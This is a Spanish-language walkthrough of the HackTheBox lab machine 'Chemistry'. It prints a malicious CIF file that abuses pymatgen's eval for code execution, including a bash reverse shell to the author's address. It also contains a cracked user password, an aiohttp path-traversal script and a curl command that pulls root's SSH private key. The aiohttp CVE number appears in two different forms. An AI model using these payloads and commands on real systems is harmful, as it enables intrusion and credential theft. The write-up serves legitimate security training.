---
title: Chemistry - Easy (HTB)
permalink: /Chemistry-HTB-Writeup/
tags:
  - "Linux"
  - "Easy"
  - "CVE-2024-23346"
  - "CVE-2024-23344"
  - "Local Port Forwarding"
  - "SSH"
  - "CIF Files"
  - "SQLite"
  - "pymatgem RCE"
categories:
  - writeup
  - hacking
  - hackthebox
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Chemistry - Easy (HTB)
seo_description: Aprende a explotar un CVE mediante archivos CIF maliciosos y enumeración de sistemas Linux para vencer Chemistry.
excerpt: Aprende a explotar un CVE mediante archivos CIF maliciosos y enumeración de sistemas Linux para vencer Chemistry.
header:
  overlay_image: /assets/images/headers/chemistry-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/chemistry-hackthebox.jpg
---
 
![image-center](/assets/images/posts/chemistry-hackthebox.png){: .align-center}

**Habilidades:** `pymatgem` (Python Library) Remote Code Execution (CVE-2024-23346) - Making a Malicious CIF File, Hash Cracking, Linux System Enumeration, SQLite Database Analysis, SSH Local Port Forwarding, Python `aiohttp` Path Traversal (CVE-2024-23344)
{: .notice--primary}


# Introducción

Chemistry es una máquina de dificultad fácil en HackTheBox en la cual aprenderás cómo explotar vulnerabilidades en aplicaciones web que procesan archivos CIF. Una vez hayamos ganado acceso aprenderemos metodologías de enumeración de sistemas Linux y explotación de vulnerabilidades conocidas relacionadas a servicios internos mal configurados.

<br>

# Reconocimiento
---
Enviaremos una traza ICMP a la máquina víctima para verificar que la máquina se encuentra activa

~~~ bash
ping -c 1 10.10.11.38
PING 10.10.11.38 (10.10.11.38) 56(84) bytes of data.
64 bytes from 10.10.11.38: icmp_seq=1 ttl=63 time=140 ms

--- 10.10.11.38 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.794/139.794/139.794/0.000 ms
~~~



## Nmap Scanning

Comenzaremos la fase de reconocimiento con un escaneo con el propósito de detectar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.38 -oG allPorts                                                            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 09:48 EDT
Nmap scan report for 10.10.11.38
Host is up (0.25s latency).
Not shown: 60755 closed tcp ports (reset), 4778 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 18.33 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil (`nmap` lo aplica por defecto)
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Mostrar la información en tiempo real

Haremos un segundo escaneo de servicios con el fin de identificar la versión y el servicio que se ejecuta en cada puerto que descubrimos

~~~ bash
nmap -sVC -p 22,5000 10.10.11.38 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-22 10:02 EDT
Nmap scan report for 10.10.11.38
Host is up (0.31s latency).

PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp filtered upnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.72 seconds
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: uso de scripts de reconocimiento
- `-oN`: Exportar en formato norma


## Web Analysis

Vemos que existe un servicio web que se ejecuta en el puerto `5000`, navegaremos hasta la dirección IP de la máquina (`10.10.11.38:5000`)

![image-center](/assets/images/posts/chemistry-web.png){: .align-center}

Podemos o iniciar sesión o registrarnos en lo que parece ser una herramienta que analiza archivos CIF, que son archivos que contienen datos acerca de la estructura interna de un cristal. En mi caso crearé un nuevo usuario `andrew`

![image-center](/assets/images/posts/chemistry-login.png){: .align-center}

Si iniciamos sesión, se nos redirige a la ruta `/dashboard`, aquí parece que podemos subir archivos

![image-center](/assets/images/posts/chemistry-dashboard.png){: .align-center}

Se nos comparte un archivo de ejemplo, subamos el archivo para ver cómo se comporta el servidor

![image-center](/assets/images/posts/chemistry-example-cif.png){: .align-center}

Se ha subido correctamente nuestro archivo `example.cif`, veamos qué contiene

![image-center](/assets/images/posts/chemistry-cif-data.png){: .align-center}



# Explotación
---
## Pymatgen Library Remote Code Execution (CVE-2024-23346)

Si hacemos una búsqueda sobre `CIF Analyzer exploit`, vemos que existe una vulnerabilidad en la librería `pymatgem` asociada a `from_transformation_str()`, que permite ejecución remota de código dentro de `eval()`. Para más información, dejo el enlace

- https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346


### File Upload

Editaremos el archivo `example.cif` para convertirlo en un archivo malicioso que ejecute instrucciones a nivel de sistema

~~~ bash
# The following field contains an embedded Python code exploit
_space_group_magn.transform_BNS_Pp_abc  
'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ 
(
    # Retrieve the second element in the Method Resolution Order (MRO) of the empty tuple `()`, which is the `object` class.
    *[().__class__.__mro__[1]]
    +
    # Concatenate with the string "__subclasses__".
    ["__sub" + "classes__"]
) () 
if d.__name__ == "BuiltinImporter"]  # Find the subclass named "BuiltinImporter"
[0].load_module("os")                # Load the `os` module
.system("touch pwned");              # Execute the system command `touch pwned`
0,0,0'

# Other CIF data fields
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
~~~

- **En primera instancia, validaré la ejecución de comandos en el servidor con una traza ICMP a mi máquina atacante**

El archivo se vería de la siguiente forma haciendo un ping dentro de la función `system()` a mi IP de HackTheBox

~~~ python
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
	_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 1 10.10.14.254");0,0,0'
~~~

Ponemos a la escucha `tcpdump` y filtramos por el protocolo `icmp` para validar que la máquina nos envíe un `ping`. Ahora renombraremos el archivo para identificarlo más fácilmente

~~~ bash
mv example.cif rce.cif
~~~

Subimos el archivo `rce.cif` y hacemos clic en `View`

![image-center](/assets/images/posts/chemistry-rce-poc.png){: .align-center}

Cuando veamos el archivo se ejecutará la traza ICMP hacia nuestra máquina

~~~ bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:20:09.970568 IP 10.10.11.38 > 10.10.14.254: ICMP echo request, id 3, seq 1, length 64
10:20:09.970632 IP 10.10.14.254 > 10.10.11.38: ICMP echo reply, id 3, seq 1, length 64
~~~

Y Recibimos la traza `icmp` correctamente. En este punto podemos intentar establecer una `reverse shell` a nuestra máquina atacante

Editamos el archivo malicioso agregando el siguiente comando

~~~ bash
# Reemplazamos $IP por nuestra IP de HTB
/bin/bash -c '/bin/bash -i >& /dev/tcp/$IP/443 0>&1'

# En demostración, usaré la siguiente dirección IP
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.162/443 0>&1'
~~~

Configuramos un listener con `nc` para recibir la `shell` cuando ejecutemos el payload

~~~ bash
nc -lvnp 443
~~~

Eliminamos el archivo y volvemos a subirlo para que esté actualizado, al verlo en la web deberíamos obtener la `shell`. El archivo que subiremos debe lucir más o menos así

~~~ bash
# The following field contains an embedded Python code exploit
_space_group_magn.transform_BNS_Pp_abc  
'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ 
(
    # Retrieve the second element in the Method Resolution Order (MRO) of the empty tuple `()`, which is the `object` class.
    *[().__class__.__mro__[1]]
    +
    # Concatenate with the string "__subclasses__".
    ["__sub" + "classes__"]
) () 
if d.__name__ == "BuiltinImporter"]  # Find the subclass named "BuiltinImporter"
[0].load_module("os")                # Load the `os` module
.system("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.14.254/443 0>&1\'");             
0,0,0'

# Other CIF data fields
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
~~~

Cuando subamos nuevamente el archivo y volvamos a hacer clic en `View`, recibiremos la conexión en nuestra máquina

~~~ bash
nc -lvnp 443    
listening on [any] 443 ...
connect to [10.10.14.254] from (UNKNOWN) [10.10.11.38] 46178
bash: cannot set terminal process group (1082): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ 
~~~

Con esto ya estaríamos dentro de la máquina víctima, podemos hacer el comando `hostname -I` para comprobar la IP y verificar que estemos en la máquina Chemistry y no en algún contenedor



# Escalada de privilegios
---
## TTY Treatment

Haremos un tratamiento de la TTY para que la consola sea más interactiva y así poder hacer uso de `CTRL + C` y `CTRL + L`

~~~ bash
script /dev/null -c bash
export TERM=xterm

# Presionamos CTRL + Z
# En nuestra máquina atacante ejecutamos lo siguiente
stty raw -echo; fg

# Volveremos a la máquina vítcima, reiniciamos la sesión
reset xterm
~~~

Ya podremos hacer `CTRL + C` sin que se nos vaya pal carajo la consola. Por último, ajustaremos las proporciones a las de nuestra terminal

~~~ bash
# En nuestra máquina vemos nuestras proporciones
stty size

45 184

# En la máquina vítcima ejecutamos lo siguiente
app@chemistry:~$ stty rows 45 columns 184
~~~~


## System Enumeration

Comenzaremos la enumeración del sistema buscando usuarios en el archivo `/etc/passwd`

~~~ bash
app@chemistry:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
~~~

Existe el usuario `rosa` aparte de nosotros (`app`) y `root`, por lo que es posible que debamos elevar nuestros privilegios primeramente al usuario `rosa` y luego a `root`


### (Posible) Sudo Privileges - `app`

Lo siguiente que haremos será listar privilegios a nivel de `sudoers`, nos pedirá la contraseña, y como no la fucking conozco, pues no será por hoy

~~~ bash
app@chemistry:~$ sudo -l
[sudo] password for app:
~~~


### (Posible) SUID Binaries

Buscaremos recursivamente en los archivos de la máquina desde la raíz aquellos archivos que contengan el bit `siud` asignado, y así poder identificar una vía potencial de escalada de privilegios

~~~ bash
app@chemistry:~$ find / -perm /4000 2>/dev/null | grep -vE "lib|snap"
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
~~~

Pero tampoco tendremos éxito con estos binarios, ya que no se conoce alguna forma de escalar privilegios usándolos


### Explore files

Lo más lógico que podríamos haber hecho al principio hubiera sido hacer el comando `ls`, pues eso haremos justo ahora

~~~ bash
app@chemistry:~$ ls 
app.py

app@chemistry:~$ cat app.py
~~~

![image-center](/assets/images/posts/chemistry-creds.png){: .align-center}

## SQLite Database Analysis

En el archivo se hace alusión a una servidor de base de datos que ejecuta `sqlite` en esta máquina, además vemos la contraseña, nos conectaremos al servicio

~~~ bash
app@chemistry:~$ sqlite3
~~~

Una vez dentro de la interfaz de `sqlite`, primeramente nos conectamos a la base de datos `database.db` y luego la enumeramos de la siguiente forma

~~~ sql
sqlite3 database.db
.tables
select username,password from user;
~~~

![image-center](/assets/images/posts/chemistry-sqlite.png){: .align-center}

Vemos que el usuario `rosa` está contemplado en la tabla `user`, además de un hash, podemos intentar crackearlo para ver si llegamos a ver la contraseña para este usuario


## Hash Cracking

Primero almacenamos el hash en un archivo, en mi caso lo nombraré `hash.txt`

~~~ bash
echo '63ed86ee9f624c7b14f1d4f43dc251a5' > hash.txt
~~~

Ahora usaremos la herramienta `john` para intentar crackear el hash

![image-center](/assets/images/posts/chemistry-hash-cracking.png){: .align-center}

Y la contraseña que encontró para el usuario `rosa` es `unicorniosrosados`. Migraremos al usuario `rosa`

~~~ bash
app@chemistry:~/instance$ su rosa
~~~

![image-center](/assets/images/posts/chemistry-user-pivoting.png){: .align-center}


## (Posible) Sudo Privileges - `rosa`

Podemos volver a listar los privilegios `sudo` para ver si `rosa` puede ejecutar algún binario como `root`, pero veremos el siguiente mensaje. Y sí, debemos volver a hacer esto por cada usuario que comprometamos

~~~ bash
rosa@chemistry:/home/app/instance$ sudo -l
[sudo] password for rosa:
Sorry, user rosa may not run sudo on chemistry.
~~~


## Enumeration - Open Ports

En el proceso de enumeración contemplaremos analizar si la víctima posee puertos abiertos de forma interna

~~~ bash
app@chemistry:~$ ss -tunl
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process  
udp    UNCONN  0       0        127.0.0.53%lo:53          0.0.0.0:*             
udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:5000        0.0.0.0:*             
tcp    LISTEN  0       128          127.0.0.1:8080        0.0.0.0:*             
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*             
tcp    LISTEN  0       128               [::]:22             [::]:* 
~~~

Vemos que el puerto `8080` se encuentra abierto internamente, o sea, solo lo podemos ver desde la máquina víctima, veamos qué contiene

~~~ bash
curl -I localhost:8080
~~~

![image-center](/assets/images/posts/chemistry-aiohttp.png){: .align-center}

Vemos que pudimos tramitar una solicitud HTTP hacia el puerto `8080`


## Python `aiohttp` Directory Traversal (CVE-2024-23344)

Si buscamos sobre  la versión de `aiohttp` que recibimos en la respuesta de la solicitud, podemos encontrar que esta versión aparentemente es vulnerable a Directory Traversal

~~~ bash
git clone https://github.com/z3rObyte/CVE-2024-23334-PoC.git
python3 -m http.server 80
~~~

Desde la máquina víctima ejecutaremos el comando `wget` para descargar el recurso que estamos compartiendo en la red

~~~ bash
wget -r http://10.10.14.162/exploit
~~~

![image-center](/assets/images/posts/chemistry-wget.png){: .align-center}

Una vez descargado, iniciaremos la explotación de esta vulnerabilidad



## SSH Local Port Forwarding

Como podemos solamente acceder al servicio HTTP desde la máquina víctima, haremos que ese puerto `8080` sea alcanzable por muestra máquina atacante con `ssh`

~~~ bash
# Ejecutamos en nuestra máquina atacante
ssh -L 8080:localhost:8080 rosa@10.10.11.38
~~~


## Path Traversal

Según el `exploit`, podemos usar el comando `curl` para recorrer directorios de la siguiente forma

~~~ bash
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
~~~

- Se envía una solicitud a una ruta `/static/` e intenta abrir el archivo `/etc/passwd`, y en cada intento retrocede un directorio hasta abrir el archivo solicitado

~~~ bash
http://localhost:8080/static/etc/passwd
http://localhost:8080/static/../etc/passwd
http://localhost:8080/static/../../etc/passwd
~~~

Como necesitamos una ruta para poder realizar la explotación, haremos fuzzing para descubrir directorios y probaremos solicitudes maliciosas contra ellos. Vemos que existe una ruta `assets`, podemos intentar hacer la solicitud a esta ruta para intentar leer el archivo `/etc/passwd`. Ejecutaremos el siguiente comando

~~~ bash
curl --path-as-is http://localhost:8080/assets/../../../etc/passwd
~~~

- `--path-as-is`: Es importante al momento de enviar la solicitud para que `curl` no altere la ruta que enviamos


## Abusing SSH `id_rsa` File

Si listamos los procesos en ejecución podremos ver que `root` ejecuta este servicio interno. Sabiendo esto, tenemos privilegios suficientes para traernos una clave privada (`id_rsa`) del directorio `/root/.ssh` y así poder usar este archivo para conectarnos como el usuario `root` a la máquina víctima (en caso de que exista), sin tener que proporcionar credenciales

~~~ bash
rosa@chemistry:~$ ps -faux
~~~

Una vez entendido el concepto procederemos a traernos la clave privada a través del Path Traversal

~~~ bash
curl --path-as-is http://localhost:8080/assets/../../../root/.ssh/id_rsa > id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3Blbn...
NhAAAA...
UbrmTG...
-----END OPENSSH PRIVATE KEY-----
~~~

Usaremos el archivo `id_rsa` como un archivo de identidad a `ssh` para conectarnos como `root`

~~~
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.38
~~~~

